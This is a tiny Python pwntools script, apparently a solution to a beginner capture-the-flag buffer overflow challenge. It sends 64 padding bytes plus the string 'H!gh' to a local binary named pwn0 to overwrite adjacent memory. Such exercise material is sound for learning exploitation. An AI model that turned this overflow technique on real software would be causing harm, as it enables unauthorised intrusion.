from pwn import *

garbage = 'a' * 64 #riempio il buffer
msg = 'H!gh'
msgin = garbage + msg

p = process('./pwn0')
p.sendline(msgin)
msgout = p.recvall() 
print('output:\t', msgout) 